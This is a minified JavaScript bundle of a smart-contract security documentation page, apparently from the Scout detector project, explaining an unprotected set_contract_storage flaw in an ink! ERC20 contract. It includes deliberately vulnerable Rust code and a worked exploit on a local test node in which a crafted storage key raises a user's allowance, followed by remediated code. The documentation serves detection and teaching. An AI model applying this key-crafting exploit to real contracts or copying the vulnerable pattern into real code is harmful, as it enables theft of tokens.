"use strict";(self.webpackChunkscout=self.webpackChunkscout||[]).push([[2688],{9613:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>h});var a=n(9496);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var c=a.createContext({}),l=function(e){var t=a.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},u=function(e){var t=l(e.components);return a.createElement(c.Provider,{value:t},e.children)},p="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,c=e.parentName,u=i(e,["components","mdxType","originalType","parentName"]),p=l(n),d=r,h=p["".concat(c,".").concat(d)]||p[d]||m[d]||o;return n?a.createElement(h,s(s({ref:t},u),{},{components:n})):a.createElement(h,s({ref:t},u))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,s=new Array(o);s[0]=d;var i={};for(var c in t)hasOwnProperty.call(t,c)&&(i[c]=t[c]);i.originalType=e,i[p]="string"==typeof e?e:r,s[1]=i;for(var l=2;l<o;l++)s[l]=n[l];return a.createElement.apply(null,s)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},3664:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>s,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>l});var a=n(2564),r=(n(9496),n(9613));const o={},s="Set contract storage",i={unversionedId:"vulnerabilities/set-contract-storage",id:"vulnerabilities/set-contract-storage",title:"Set contract storage",description:"Description",source:"@site/docs/vulnerabilities/2-set-contract-storage.md",sourceDirName:"vulnerabilities",slug:"/vulnerabilities/set-contract-storage",permalink:"/scout/docs/vulnerabilities/set-contract-storage",draft:!1,editUrl:"https://github.com/CoinFabrik/scout/docs/vulnerabilities/2-set-contract-storage.md",tags:[],version:"current",sidebarPosition:2,frontMatter:{},sidebar:"docsSidebar",previous:{title:"Integer overflow or underflow",permalink:"/scout/docs/vulnerabilities/integer-overflow-or-underflow"},next:{title:"Reentrancy",permalink:"/scout/docs/vulnerabilities/reentrancy"}},c={},l=[{value:"Description",id:"description",level:2},{value:"Exploit Scenario",id:"exploit-scenario",level:2},{value:"Deployment",id:"deployment",level:3},{value:"Remediation",id:"remediation",level:2},{value:"References",id:"references",level:2}],u={toc:l},p="wrapper";function m(e){let{components:t,...n}=e;return(0,r.kt)(p,(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"set-contract-storage"},"Set contract storage"),(0,r.kt)("h2",{id:"description"},"Description"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Vulnerability Category: ",(0,r.kt)("inlineCode",{parentName:"li"},"Authorization")),(0,r.kt)("li",{parentName:"ul"},"Severity: ",(0,r.kt)("inlineCode",{parentName:"li"},"Critical")),(0,r.kt)("li",{parentName:"ul"},"Detectors: ",(0,r.kt)("a",{parentName:"li",href:"https://github.com/CoinFabrik/scout/tree/main/detectors/set-contract-storage"},(0,r.kt)("inlineCode",{parentName:"a"},"set-contract-storage"))),(0,r.kt)("li",{parentName:"ul"},"Test Cases: ",(0,r.kt)("a",{parentName:"li",href:"https://github.com/CoinFabrik/scout/tree/main/test-cases/set-contract-storage/set-contract-storage-1"},(0,r.kt)("inlineCode",{parentName:"a"},"set-contract-storage-1")))),(0,r.kt)("p",null,"Smart contract can store important information in memory which changes\nthrough the contract's lifecycle. Changes happen via user interaction with\nthe smart contract. An ",(0,r.kt)("em",{parentName:"p"},"unauthorized set contract storage")," vulnerability\nhappens when a smart contract call allows a user to set or modify contract\nmemory when he was not supposed to be authorized."),(0,r.kt)("p",null,"In this example, we see how this vulnerability can be exploited to change a\nuser's allowance in an ",(0,r.kt)("a",{parentName:"p",href:"https://ethereum.org/en/developers/docs/standards/tokens/erc-20/"},"ERC20"),"\ncontract."),(0,r.kt)("h2",{id:"exploit-scenario"},"Exploit Scenario"),(0,r.kt)("p",null,"In this example we see that any user may access the\n",(0,r.kt)("inlineCode",{parentName:"p"},"set_contract_storage()")," function, and therefore modify the value for any key\narbitrarily."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-rust"},"#[ink::trait_definition]\npub trait MisusedSetContractStorage {\n    #[ink(message)]\n    fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()>;\n}\n\n\nimpl MisusedSetContractStorage for Erc20 {\n    #[ink(message)]\n    fn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()> {\n        env::set_contract_storage(&user_input_key, &user_input_data);\n        Ok(())\n    }\n}\n")),(0,r.kt)("p",null,"The vulnerable code example can be found ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/CoinFabrik/scout/blob/main/test-cases/set-contract-storage/set-contract-storage-1/vulnerable-example/src/lib.rs"},"here"),"."),(0,r.kt)("h3",{id:"deployment"},"Deployment"),(0,r.kt)("p",null,"To compile this example, ",(0,r.kt)("inlineCode",{parentName:"p"},"cargo-contract")," v2.0.1 (or above) is required."),(0,r.kt)("p",null,"In order to run this exploit, ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/paritytech/substrate-contracts-node/releases"},"download"),", unzip and run a substrate node with ",(0,r.kt)("inlineCode",{parentName:"p"},"./substrate-contract-node"),". Download the contents of the ",(0,r.kt)("inlineCode",{parentName:"p"},"example")," folder associated to this detector and compile the contract running ",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract build")," and build the binary."),(0,r.kt)("p",null,"Afterwards, upload the binary into the running network with the account ",(0,r.kt)("inlineCode",{parentName:"p"},"Alice")," using ",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract upload --suri //Alice ./target/ink/my_contract.contract"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},'$ cargo contract upload --suri //Alice ./target/ink/my_contract.contract\n\n      Events\n       Event Balances \u279c Withdraw\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         amount: 3.366751549mUNIT\n       Event Balances \u279c Reserved\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         amount: 587.83mUNIT\n       Event Contracts \u279c CodeStored\n         code_hash: 0xacb7ab745fa131cf8a8eb0f5bb2d98f88ea186da39dee2e80b1289bcfd9d7f25\n       Event TransactionPayment \u279c TransactionFeePaid\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         actual_fee: 3.366751549mUNIT\n         tip: 0UNIT\n       Event System \u279c ExtrinsicSuccess\n         dispatch_info: DispatchInfo { weight: Weight { ref_time: 3366724431, proof_size: 0 }, class: Normal, pays_fee: Yes }\n\n   Code hash "0xacb7ab745fa131cf8a8eb0f5bb2d98f88ea186da39dee2e80b1289bcfd9d7f25"\n')),(0,r.kt)("p",null,"Instantiate the uploaded smart contract with 100000 tokens from ",(0,r.kt)("inlineCode",{parentName:"p"},"Alice")," running\n",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract instantiate --args 100000 --suri //Alice"),", press ",(0,r.kt)("inlineCode",{parentName:"p"},"y")," and\n",(0,r.kt)("inlineCode",{parentName:"p"},"[Enter]"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cargo contract instantiate --args 100000 --suri //Alice\n\n Dry-running new (skip with --skip-dry-run)\n    Success! Gas required estimated at Weight(ref_time: 1173504383, proof_size: 0)\nConfirm transaction details: (skip with --skip-confirm)\n Constructor new\n        Args 100000\n   Gas limit Weight(ref_time: 1173504383, proof_size: 0)\nSubmit? (Y/n): y\n      Events\n       Event Balances \u279c Withdraw\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         amount: 99.001146\u03bcUNIT\n       Event System \u279c NewAccount\n         account: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n       Event Balances \u279c Endowed\n         account: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         free_balance: 100.605mUNIT\n       Event Balances \u279c Transfer\n         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 100.605mUNIT\n       Event Balances \u279c Reserved\n         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 100.605mUNIT\n       Event Contracts \u279c ContractEmitted\n         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         data: Transfer { from: None, to: Some(5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY), value: 100000 }\n       Event Contracts \u279c Instantiated\n         deployer: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n       Event Balances \u279c Transfer\n         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 200.16mUNIT\n       Event Balances \u279c Reserved\n         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 200.16mUNIT\n       Event TransactionPayment \u279c TransactionFeePaid\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         actual_fee: 99.001146\u03bcUNIT\n         tip: 0UNIT\n       Event System \u279c ExtrinsicSuccess\n         dispatch_info: DispatchInfo { weight: Weight { ref_time: 5236087078, proof_size: 0 }, class: Normal, pays_fee: Yes }\n\n    Contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n\n")),(0,r.kt)("p",null,"Notice that, in this case, the contract address is\n",(0,r.kt)("inlineCode",{parentName:"p"},"5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf"),".\nFor Alice, her address is by default\n",(0,r.kt)("inlineCode",{parentName:"p"},"5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY")," and Bob's address is\n",(0,r.kt)("inlineCode",{parentName:"p"},"5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty"),"."),(0,r.kt)("p",null,"You can get Alice's allowance for Bob with the following command\n",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run"),".\nMake sure to replace the contract address with the one you obtained. In this\ncase, you will see that the allowance is set to zero."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run\n\n      Result Success!\n    Reverted false\n        Data Ok(0)\n\n")),(0,r.kt)("p",null,"Alice can approve a higher allowance for Bob using the ",(0,r.kt)("inlineCode",{parentName:"p"},"approve()")," function\nwith the command\n",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::approve --args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10 --suri //Alice\n\n Dry-running BaseErc20::approve (skip with --skip-dry-run)\n    Success! Gas required estimated at Weight(ref_time: 7983333376, proof_size: 262144)\nConfirm transaction details: (skip with --skip-confirm)\n     Message BaseErc20::approve\n        Args 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty 10\n   Gas limit Weight(ref_time: 7983333376, proof_size: 262144)\nSubmit? (Y/n): y\n      Events\n       Event Balances \u279c Withdraw\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         amount: 98.974204\u03bcUNIT\n       Event Contracts \u279c ContractEmitted\n         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         data: Approval { owner: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY, spender: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty, value: 10 }\n       Event Contracts \u279c Called\n         caller: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n       Event Balances \u279c Transfer\n         from: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         to: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 100.08mUNIT\n       Event Balances \u279c Reserved\n         who: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n         amount: 100.08mUNIT\n       Event TransactionPayment \u279c TransactionFeePaid\n         who: 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY\n         actual_fee: 98.974204\u03bcUNIT\n         tip: 0UNIT\n       Event System \u279c ExtrinsicSuccess\n         dispatch_info: DispatchInfo { weight: Weight { ref_time: 3485758564, proof_size: 30498 }, class: Normal, pays_fee: Yes }\n")),(0,r.kt)("p",null,"Let us assume Bob is a malicious user and he wants to set a higher allowance\nfor himself without Alice's approval. Taking a look at the smart contract,\nhe notices that the function ",(0,r.kt)("inlineCode",{parentName:"p"},"misused_set_contract_storage()")," has no access\ncontrol validation and uses the ",(0,r.kt)("inlineCode",{parentName:"p"},"set_contract_storage()")," function. Working on\nthe input of this function, he could change the contract's storage and his\nallowance."),(0,r.kt)("p",null,"In order to do this, he runs the following command ",(0,r.kt)("inlineCode",{parentName:"p"},"cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message MisusedSetContractStorage::misused_set_contract_storage --args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000 --suri //Bob"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message MisusedSetContractStorage::misused_set_contract_storage --args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000 --suri //Bob\n\n Dry-running MisusedSetContractStorage::misused_set_contract_storage (skip with --skip-dry-run)\n    Success! Gas required estimated at Weight(ref_time: 7983333376, proof_size: 262144)\nConfirm transaction details: (skip with --skip-confirm)\n     Message MisusedSetContractStorage::misused_set_contract_storage\n        Args [255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72] 1000000\n   Gas limit Weight(ref_time: 7983333376, proof_size: 262144)\nSubmit? (Y/n): y\n      Events\n       Event Balances \u279c Withdraw\n         who: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty\n         amount: 98.974241\u03bcUNIT\n       Event Contracts \u279c Called\n         caller: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty\n         contract: 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf\n       Event TransactionPayment \u279c TransactionFeePaid\n         who: 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty\n         actual_fee: 98.974241\u03bcUNIT\n         tip: 0UNIT\n       Event System \u279c ExtrinsicSuccess\n         dispatch_info: DispatchInfo { weight: Weight { ref_time: 2142080861, proof_size: 30498 }, class: Normal, pays_fee: Yes }\n")),(0,r.kt)("p",null,"If we check now Bob's allowance, we see that he has access to 1000000 tokens!"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-bash"},"$ cargo contract call --contract 5Gj5Z1Nf8NPkaP2iuBQhkJQRt1f7Nt7H2umwbrRRnonnKEQf --message BaseErc20::allowance --args 5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY 5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty --suri //Alice --dry-run\n\n      Result Success!\n    Reverted false\n        Data Ok(1000000)\n")),(0,r.kt)("p",null,"Breaking down the used key ",(0,r.kt)("inlineCode",{parentName:"p"},"[255,0,0,0,212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125,142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]"),",\nwe note that:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"[255,0,0,0]")," stands for allowances mapping."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"[212,53,147,199,21,253,211,28,97,20,26,189,4,169,159,214,130,44,133,88,133,76,205,227,154,86,132,231,165,109,162,125]")," corresponds, byte by byte, to Alice's address ",(0,r.kt)("inlineCode",{parentName:"li"},"5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY"),"."),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"[142,175,4,21,22,135,115,99,38,201,254,161,126,37,252,82,135,97,54,147,201,18,144,156,178,38,170,71,148,242,106,72]")," corresponds, byte by byte, to Bob's address ",(0,r.kt)("inlineCode",{parentName:"li"},"5FHneW46xGXgs5mUiveU4sbTyGBzmstUspZC92UhjJM694ty"),".")),(0,r.kt)("h2",{id:"remediation"},"Remediation"),(0,r.kt)("p",null,"Arbitrary users should not have control over keys because it implies writing\nany value of a mapping, lazy variable, or the main struct of the contract\nlocated in position 0 of the storage.\nTo prevent this issue, set access control and proper authorization validation\nfor the ",(0,r.kt)("inlineCode",{parentName:"p"},"set_contract_storage()")," function. "),(0,r.kt)("p",null,"Arbitrary users should not have control over keys because it implies writing\nany value of a mapping, lazy variable, or the main struct of the contract\nlocated in position 0 of the storage.\nSet access control and proper authorization validation for the\n",(0,r.kt)("inlineCode",{parentName:"p"},"set_contract_storage()")," function."),(0,r.kt)("p",null,"For example, the code below, ensures only the owner can call\n",(0,r.kt)("inlineCode",{parentName:"p"},"misused_set_contract_storage()"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-rust"},"#[ink(message)]\nfn misused_set_contract_storage(&mut self, user_input_key: [u8; 68], user_input_data: u128) -> Result<()> {\n    if self.env().caller() == self.owner {\n        env::set_contract_storage(&user_input_key, &user_input_data);\n        Ok(())\n    } else {\n        Err(Error::UserNotOwner)\n    }\n}\n")),(0,r.kt)("p",null,"The remediated code example can be found ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/CoinFabrik/scout/blob/main/test-cases/set-contract-storage/set-contract-storage-1/remediated-example/src/lib.rs"},"here"),"."),(0,r.kt)("h2",{id:"references"},"References"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://use.ink/datastructures/storage-layout"},"https://use.ink/datastructures/storage-layout"))))}m.isMDXComponent=!0}}]);